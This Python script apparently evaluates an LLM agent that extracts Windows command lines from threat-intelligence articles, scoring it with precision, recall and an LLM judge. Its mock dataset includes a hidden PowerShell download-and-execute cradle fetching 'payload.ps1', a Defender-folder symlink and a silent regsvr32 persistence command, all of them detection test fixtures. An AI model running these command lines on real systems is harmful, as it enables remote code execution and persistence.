#!/usr/bin/env python3
"""
Commandline Extractor Evaluation Script

This script evaluates the commandline extractor agent against ground truth datasets.
Supports both quantitative metrics and LLM-as-a-Judge evaluation.

Usage:
    # Evaluate all articles in a dataset
    python evaluate_cmdline_extractor.py --preset cmdline_eval_preset.json

    # Evaluate a specific article by ID from dataset
    python evaluate_cmdline_extractor.py --preset cmdline_eval_preset.json --article-id sample_1

    # Evaluate a single article from JSON string
    python evaluate_cmdline_extractor.py --single-article '{"id":"test","input":{"article_content":"cmd.exe /c echo test"},"expected_output":{"cmdline_items":["cmd.exe /c echo test"]}}'

    # Evaluate a single article from JSON file
    python evaluate_cmdline_extractor.py --single-article /path/to/article.json

    # Evaluate article directly from Postgres database
    python evaluate_cmdline_extractor.py --db-article-id 12345
"""

import os
import json
import logging
import argparse
from typing import Dict, List, Any, Optional
from pathlib import Path

# Third-party imports
try:
    from agentevals.trajectory.llm import create_trajectory_llm_as_judge
    from agentevals.trajectory.match import create_trajectory_match_evaluator

    AGENTEVALS_AVAILABLE = True
except ImportError:
    AGENTEVALS_AVAILABLE = False

# Local imports
from src.database.manager import DatabaseManager
from src.services.llm_service import LLMService
from src.workflows.agentic_workflow import create_agentic_workflow
from src.utils.langfuse_client import (
    trace_workflow_execution,
    get_langfuse_client,
    is_langfuse_enabled,
)

# Import prompts directly as strings for now
CMDLINE_EXTRACTION_PROMPT = """
You are a specialized extraction agent focused on extracting explicit Windows command-line observables from threat intelligence articles.
Extract only Windows command lines that appear literally in the article content, contain a Windows executable or system utility, and include at least one argument, switch, parameter, pipeline, or redirection.
[extraction criteria here...]
"""

CMDLINE_QA_PROMPT = """
You are a QA specialist validating Windows command-line extractions.
[QA criteria here...]
"""

# Configure logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class CommandlineExtractorEvaluator:
    """Evaluator for commandline extractor performance."""

    def __init__(self, config: Dict[str, Any]):
        """
        Initialize the evaluator.

        Args:
            config: Configuration dictionary loaded from preset file
        """
        self.config = config
        self.db_manager = DatabaseManager()
        self.llm_service = LLMService()

        # Initialize evaluators
        self.evaluators = self._setup_evaluators()

        # Load ground truth data
        self.ground_truth = self._load_ground_truth()

        logger.info("Commandline Extractor Evaluator initialized")

    def _setup_evaluators(self) -> Dict[str, Any]:
        """Set up evaluation functions."""
        evaluators = {}

        # LLM-as-a-Judge evaluator for extraction quality
        if self.config.get("use_llm_judge", True) and AGENTEVALS_AVAILABLE:
            evaluators["llm_judge"] = create_trajectory_llm_as_judge(
                prompt=self.config.get(
                    "judge_prompt", self._get_default_judge_prompt()
                ),
                model=self.config.get("judge_model", "openai:o3-mini"),
                continuous=self.config.get("continuous_scoring", False),
            )
        elif self.config.get("use_llm_judge", True):
            logger.warning(
                "LLM judge evaluation requested but agentevals not available"
            )

        # Trajectory match evaluator for exact matches
        if self.config.get("use_trajectory_match", True) and AGENTEVALS_AVAILABLE:
            evaluators["trajectory_match"] = create_trajectory_match_evaluator(
                trajectory_match_mode=self.config.get("match_mode", "unordered")
            )
        elif self.config.get("use_trajectory_match", True):
            logger.warning(
                "Trajectory match evaluation requested but agentevals not available"
            )

        return evaluators

    def _get_default_judge_prompt(self) -> str:
        """Get default LLM judge prompt for commandline extraction."""
        return """
        You are evaluating the quality of Windows command-line extraction from threat intelligence.

        Evaluate how well the extracted commands match what should be found in the article.
        Consider:
        - Are all valid Windows command lines extracted?
        - Are there any false positives (commands not in the article)?
        - Are multi-line commands properly reconstructed?
        - Do extracted commands follow Windows syntax rules?

        Rate the extraction quality from 0-1:
        1.0 = Perfect extraction, all commands found, no false positives
        0.5 = Good extraction with minor issues
        0.0 = Poor extraction with major omissions or false positives

        Provide your score and reasoning.
        """

    def _load_ground_truth(self) -> List[Dict[str, Any]]:
        """Load ground truth dataset."""
        dataset_name = self.config.get("ground_truth_dataset")
        if not dataset_name:
            raise ValueError("ground_truth_dataset must be specified in config")

        # Load from LangFuse or local file
        if self.config.get("dataset_source") == "langfuse":
            return self._load_langfuse_dataset(dataset_name)
        else:
            return self._load_local_dataset(dataset_name)

    def _load_langfuse_dataset(self, dataset_name: str) -> List[Dict[str, Any]]:
        """Load dataset from LangFuse."""
        # For now, return mock data since we don't have the exact LangFuse API
        logger.info(
            f"Using mock data for LangFuse dataset {dataset_name} (API integration pending)"
        )

        return [
            {
                "id": "sample_cmdline_1",
                "input": {
                    "article_content": 'The attackers used cmd.exe /c mklink /D "C:\\ProgramData\\roming" "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0" to create a symbolic link. They also executed powershell -w hidden -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://example.com/payload.ps1\')" to download additional malware.',
                    "article_title": "Advanced Persistent Threat Campaign Analysis",
                },
                "expected_output": {
                    "cmdline_items": [
                        'cmd.exe /c mklink /D "C:\\ProgramData\\roming" "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0"',
                        "powershell -w hidden -nop -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\"",
                    ]
                },
                "metadata": {"source": "mock_data", "difficulty": "medium"},
            },
            {
                "id": "sample_cmdline_2",
                "input": {
                    "article_content": 'Security researchers discovered that the malware uses regsvr32.exe /S "C:\\ProgramData\\Roning\\goldendays.dll" for persistence. The command was found in the Sysmon logs.',
                    "article_title": "Malware Analysis Report",
                },
                "expected_output": {
                    "cmdline_items": [
                        'regsvr32.exe /S "C:\\ProgramData\\Roning\\goldendays.dll"'
                    ]
                },
                "metadata": {"source": "mock_data", "difficulty": "easy"},
            },
        ]

        # For now, return mock data since we don't have the exact LangFuse API
        logger.info(
            f"Using mock data for LangFuse dataset {dataset_name} (API integration pending)"
        )

        return [
            {
                "id": "sample_cmdline_1",
                "input": {
                    "article_content": 'The attackers used cmd.exe /c mklink /D "C:\\ProgramData\\roming" "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0" to create a symbolic link. They also executed powershell -w hidden -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://example.com/payload.ps1\')" to download additional malware.',
                    "article_title": "Advanced Persistent Threat Campaign Analysis",
                },
                "expected_output": {
                    "cmdline_items": [
                        'cmd.exe /c mklink /D "C:\\ProgramData\\roming" "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0"',
                        "powershell -w hidden -nop -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\"",
                    ]
                },
                "metadata": {"source": "mock_data", "difficulty": "medium"},
            },
            {
                "id": "sample_cmdline_2",
                "input": {
                    "article_content": 'Security researchers discovered that the malware uses regsvr32.exe /S "C:\\ProgramData\\Roning\\goldendays.dll" for persistence. The command was found in the Sysmon logs.',
                    "article_title": "Malware Analysis Report",
                },
                "expected_output": {
                    "cmdline_items": [
                        'regsvr32.exe /S "C:\\ProgramData\\Roning\\goldendays.dll"'
                    ]
                },
                "metadata": {"source": "mock_data", "difficulty": "easy"},
            },
        ]

    def _load_local_dataset(self, dataset_path: str) -> List[Dict[str, Any]]:
        """Load dataset from local JSON file."""
        try:
            with open(dataset_path, "r") as f:
                data = json.load(f)

            if isinstance(data, list):
                return data
            elif isinstance(data, dict) and "items" in data:
                return data["items"]
            else:
                raise ValueError("Invalid dataset format")

        except Exception as e:
            logger.error(f"Failed to load local dataset: {e}")
            raise

    def _load_db_article(self, article_id: int) -> List[Dict[str, Any]]:
        """Load a single article from the Postgres database."""
        try:
            # Import here to avoid circular imports
            from src.database.manager import DatabaseManager

            # Create database manager
            db_manager = DatabaseManager()

            # Get article from database
            article = db_manager.get_article(article_id)

            if not article:
                raise ValueError(f"Article with ID {article_id} not found in database")

            # Convert to evaluation format
            # Note: Database articles don't have ground truth labels, so expected_output is empty.
            # This mode is primarily for testing extraction quality without ground truth comparison.
            # For full evaluation with metrics, use a JSON file with expected_output or a LangFuse dataset.

            eval_item = {
                "id": f"db_article_{article_id}",
                "input": {
                    "article_content": article.content,
                    "article_title": article.title,
                },
                "expected_output": {
                    "cmdline_items": []  # Empty - user needs to provide ground truth
                },
                "metadata": {
                    "source": "database",
                    "db_id": article_id,
                    "canonical_url": article.canonical_url,
                    "published_at": article.published_at.isoformat()
                    if article.published_at
                    else None,
                },
            }

            logger.info(f"Loaded article {article_id} from database: '{article.title}'")
            return [eval_item]

        except Exception as e:
            logger.error(f"Failed to load article {article_id} from database: {e}")
            raise

    def evaluate_single_item(self, item: Dict[str, Any]) -> Dict[str, Any]:
        """
        Evaluate a single dataset item.

        Args:
            item: Dataset item with input, expected_output, metadata

        Returns:
            Evaluation results dictionary
        """
        item_id = item.get("id", "unknown")
        logger.info(f"Evaluating item: {item_id}")

        try:
            # Extract article content
            article_content = item["input"].get("article_content", "")
            article_title = item["input"].get("article_title", "")

            if not article_content:
                raise ValueError("Article content is required")

            # Run commandline extraction
            extraction_result = self._run_cmdline_extraction(
                article_content, article_title
            )

            # Get expected output
            expected_commands = item.get("expected_output", {}).get("cmdline_items", [])

            # Run evaluations
            eval_results = self._run_evaluations(
                extraction_result, expected_commands, item
            )

            # Combine results
            result = {
                "item_id": item_id,
                "extraction_result": extraction_result,
                "expected_commands": expected_commands,
                "evaluations": eval_results,
                "metadata": item.get("metadata", {}),
                "status": "success",
            }

            logger.info(f"Completed evaluation for item {item_id}")
            return result

        except Exception as e:
            logger.error(f"Failed to evaluate item {item_id}: {e}")
            return {
                "item_id": item_id,
                "status": "error",
                "error": str(e),
                "metadata": item.get("metadata", {}),
            }

    def _run_cmdline_extraction(
        self, article_content: str, article_title: str
    ) -> Dict[str, Any]:
        """Run commandline extraction on article content."""
        try:
            # Create workflow for commandline extraction only
            # This is a simplified version - in practice you'd run the full agentic workflow
            # but filter to only the CmdlineExtract step

            # For now, simulate extraction using LLM service directly
            messages = [
                {"role": "system", "content": CMDLINE_EXTRACTION_PROMPT},
                {
                    "role": "user",
                    "content": f"Article Title: {article_title}\n\nArticle Content:\n{article_content}",
                },
            ]

            # Use LLM service to extract commands
            import asyncio

            response = asyncio.run(
                self.llm_service.request_chat(
                    provider="lmstudio",
                    model_name="qwen/qwen2.5-coder-14b",
                    messages=messages,
                    max_tokens=1000,
                    temperature=0.1,
                    timeout=60,
                    failure_context="Failed to extract command lines",
                )
            )

            # Parse JSON response
            result_text = response["choices"][0]["message"]["content"]
            try:
                parsed_result = json.loads(result_text)
                return parsed_result
            except json.JSONDecodeError:
                logger.warning(f"Failed to parse JSON response: {result_text}")
                return {"cmdline_items": [], "count": 0, "raw_response": result_text}

        except Exception as e:
            logger.error(f"Commandline extraction failed: {e}")
            return {"cmdline_items": [], "count": 0, "error": str(e)}

    def _run_evaluations(
        self,
        extraction_result: Dict[str, Any],
        expected_commands: List[str],
        item: Dict[str, Any],
    ) -> Dict[str, Any]:
        """Run all configured evaluations."""
        results = {}

        extracted_commands = extraction_result.get("cmdline_items", [])

        # Calculate basic metrics
        results["basic_metrics"] = self._calculate_basic_metrics(
            extracted_commands, expected_commands
        )

        # Run LLM-as-a-Judge evaluation
        if "llm_judge" in self.evaluators:
            try:
                judge_result = self.evaluators["llm_judge"](
                    outputs=self._format_trajectory(extraction_result, item),
                    reference_outputs=self._format_reference_trajectory(
                        expected_commands, item
                    ),
                )
                results["llm_judge"] = judge_result
            except Exception as e:
                logger.error(f"LLM judge evaluation failed: {e}")
                results["llm_judge"] = {"error": str(e)}

        # Run trajectory match evaluation
        if "trajectory_match" in self.evaluators:
            try:
                match_result = self.evaluators["trajectory_match"](
                    outputs=self._format_trajectory(extraction_result, item),
                    reference_outputs=self._format_reference_trajectory(
                        expected_commands, item
                    ),
                )
                results["trajectory_match"] = match_result
            except Exception as e:
                logger.error(f"Trajectory match evaluation failed: {e}")
                results["trajectory_match"] = {"error": str(e)}

        return results

    def _calculate_basic_metrics(
        self, extracted: List[str], expected: List[str]
    ) -> Dict[str, Any]:
        """Calculate basic extraction metrics."""
        # Normalize commands for comparison
        extracted_norm = [self._normalize_command(cmd) for cmd in extracted]
        expected_norm = [self._normalize_command(cmd) for cmd in expected]

        # Calculate metrics
        true_positives = len(set(extracted_norm) & set(expected_norm))
        false_positives = len(set(extracted_norm) - set(expected_norm))
        false_negatives = len(set(expected_norm) - set(extracted_norm))

        precision = (
            true_positives / (true_positives + false_positives)
            if (true_positives + false_positives) > 0
            else 0
        )
        recall = (
            true_positives / (true_positives + false_negatives)
            if (true_positives + false_negatives) > 0
            else 0
        )
        f1 = (
            2 * precision * recall / (precision + recall)
            if (precision + recall) > 0
            else 0
        )

        return {
            "precision": precision,
            "recall": recall,
            "f1_score": f1,
            "true_positives": true_positives,
            "false_positives": false_positives,
            "false_negatives": false_negatives,
            "extracted_count": len(extracted),
            "expected_count": len(expected),
        }

    def _normalize_command(self, command: str) -> str:
        """Normalize command for comparison."""
        if not command:
            return ""

        # Remove extra whitespace, normalize case
        normalized = " ".join(command.split()).lower()

        # Normalize common variations
        # Add more normalization rules as needed

        return normalized

    def _format_trajectory(
        self, extraction_result: Dict[str, Any], item: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Format extraction result as trajectory for evaluation."""
        return [
            {
                "role": "user",
                "content": f"Extract command lines from: {item['input'].get('article_title', '')}",
            },
            {"role": "assistant", "content": json.dumps(extraction_result)},
        ]

    def _format_reference_trajectory(
        self, expected_commands: List[str], item: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Format expected output as reference trajectory."""
        return [
            {
                "role": "user",
                "content": f"Extract command lines from: {item['input'].get('article_title', '')}",
            },
            {
                "role": "assistant",
                "content": json.dumps(
                    {
                        "cmdline_items": expected_commands,
                        "count": len(expected_commands),
                    }
                ),
            },
        ]

    def run_evaluation(self, article_id: Optional[str] = None) -> Dict[str, Any]:
        """Run evaluation on ground truth items."""
        if article_id:
            # Filter to specific article
            filtered_items = [
                item for item in self.ground_truth if item["id"] == article_id
            ]
            if not filtered_items:
                raise ValueError(f"Article with ID '{article_id}' not found in dataset")
            items_to_evaluate = filtered_items
            logger.info(f"Evaluating specific article: {article_id}")
        else:
            items_to_evaluate = self.ground_truth
            logger.info(f"Starting evaluation of {len(self.ground_truth)} items")

        results = []
        for item in items_to_evaluate:
            result = self.evaluate_single_item(item)
            results.append(result)

        # Aggregate results
        summary = self._aggregate_results(results)

        return {
            "config": self.config,
            "results": results,
            "summary": summary,
            "total_items": len(results),
            "successful_evaluations": len(
                [r for r in results if r["status"] == "success"]
            ),
        }

    def _aggregate_results(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Aggregate evaluation results across all items."""
        successful_results = [r for r in results if r["status"] == "success"]

        if not successful_results:
            return {"error": "No successful evaluations"}

        # Aggregate basic metrics
        basic_metrics = []
        llm_judge_scores = []
        trajectory_match_scores = []

        for result in successful_results:
            evals = result.get("evaluations", {})

            if "basic_metrics" in evals:
                basic_metrics.append(evals["basic_metrics"])

            if (
                "llm_judge" in evals
                and isinstance(evals["llm_judge"], dict)
                and "score" in evals["llm_judge"]
            ):
                llm_judge_scores.append(evals["llm_judge"]["score"])

            if (
                "trajectory_match" in evals
                and isinstance(evals["trajectory_match"], dict)
                and "score" in evals["trajectory_match"]
            ):
                trajectory_match_scores.append(evals["trajectory_match"]["score"])

        summary = {
            "total_evaluated": len(successful_results),
            "basic_metrics_avg": {},
            "llm_judge_avg_score": None,
            "trajectory_match_avg_score": None,
        }

        # Average basic metrics
        if basic_metrics:
            metric_keys = [
                "precision",
                "recall",
                "f1_score",
                "true_positives",
                "false_positives",
                "false_negatives",
            ]
            for key in metric_keys:
                values = [m[key] for m in basic_metrics if key in m]
                if values:
                    if key in ["precision", "recall", "f1_score"]:
                        summary["basic_metrics_avg"][key] = sum(values) / len(values)
                    else:
                        summary["basic_metrics_avg"][key] = sum(values)

        # Average LLM judge scores
        if llm_judge_scores:
            summary["llm_judge_avg_score"] = sum(llm_judge_scores) / len(
                llm_judge_scores
            )

        # Average trajectory match scores
        if trajectory_match_scores:
            summary["trajectory_match_avg_score"] = sum(trajectory_match_scores) / len(
                trajectory_match_scores
            )

        return summary


def load_config(preset_file: str) -> Dict[str, Any]:
    """Load configuration from preset file."""
    try:
        with open(preset_file, "r") as f:
            config = json.load(f)

        # Validate required fields
        required_fields = ["ground_truth_dataset"]
        for field in required_fields:
            if field not in config:
                raise ValueError(f"Required field '{field}' missing from config")

        return config

    except Exception as e:
        logger.error(f"Failed to load config from {preset_file}: {e}")
        raise


def save_results(results: Dict[str, Any], output_file: str):
    """Save evaluation results to file."""
    try:
        with open(output_file, "w") as f:
            json.dump(results, f, indent=2, default=str)

        logger.info(f"Results saved to {output_file}")

    except Exception as e:
        logger.error(f"Failed to save results: {e}")


def load_single_article(article_input: str) -> List[Dict[str, Any]]:
    """Load a single article from JSON string or file path."""
    try:
        # Try to parse as JSON string first
        article_data = json.loads(article_input)
        if isinstance(article_data, dict):
            return [article_data]
        elif isinstance(article_data, list):
            return article_data
        else:
            raise ValueError("Invalid JSON format")
    except json.JSONDecodeError:
        # If not valid JSON, treat as file path
        try:
            with open(article_input, "r") as f:
                article_data = json.load(f)
            if isinstance(article_data, dict):
                return [article_data]
            elif isinstance(article_data, list):
                return article_data
            else:
                raise ValueError("Invalid file format")
        except Exception as e:
            raise ValueError(f"Could not load article from '{article_input}': {e}")


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(description="Evaluate Commandline Extractor")
    parser.add_argument(
        "--preset",
        help="Preset configuration file (optional if using --single-article)",
    )
    parser.add_argument(
        "--output", default="cmdline_eval_results.json", help="Output file for results"
    )
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument(
        "--article-id", help="Process only the specified article ID from the dataset"
    )
    parser.add_argument(
        "--single-article",
        help="Process a single article from JSON string or file path",
    )
    parser.add_argument(
        "--db-article-id",
        type=int,
        help="Process article directly from Postgres database by ID",
    )

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    try:
        if args.db_article_id:
            # Database article mode - minimal config
            config = {
                "ground_truth_dataset": f"db_article_{args.db_article_id}",
                "dataset_source": "mock",
                "use_llm_judge": False,
                "use_trajectory_match": False,
            }

            # Create evaluator first to access database loading method
            evaluator = CommandlineExtractorEvaluator(config)
            evaluator.ground_truth = evaluator._load_db_article(args.db_article_id)

        elif args.single_article:
            # Single article mode - minimal config
            config = {
                "ground_truth_dataset": "single_article",
                "dataset_source": "mock",
                "use_llm_judge": False,
                "use_trajectory_match": False,
            }

            # Load single article
            ground_truth = load_single_article(args.single_article)

            # Create evaluator with custom ground truth
            evaluator = CommandlineExtractorEvaluator(config)
            evaluator.ground_truth = ground_truth  # Override loaded ground truth

        else:
            # Dataset mode - requires preset
            if not args.preset:
                parser.error("--preset is required when not using --single-article")
            config = load_config(args.preset)

            # Create evaluator
            evaluator = CommandlineExtractorEvaluator(config)

        # Run evaluation
        results = evaluator.run_evaluation(article_id=args.article_id)

        # Save results
        save_results(results, args.output)

        # Print summary
        summary = results["summary"]
        print("\n" + "=" * 50)
        print("EVALUATION SUMMARY")
        print("=" * 50)
        print(f"Total items evaluated: {summary['total_evaluated']}")

        if "basic_metrics_avg" in summary:
            bm = summary["basic_metrics_avg"]
            print("\nBasic Metrics (averaged):")
            print(f"Precision: {bm.get('precision', 0):.3f}")
            print(f"Recall: {bm.get('recall', 0):.3f}")
            print(f"F1 Score: {bm.get('f1_score', 0):.3f}")

        if summary.get("llm_judge_avg_score") is not None:
            print(".3f")

        if summary.get("trajectory_match_avg_score") is not None:
            print(".3f")

        print(f"\nDetailed results saved to: {args.output}")

    except Exception as e:
        logger.error(f"Evaluation failed: {e}")
        raise


if __name__ == "__main__":
    main()
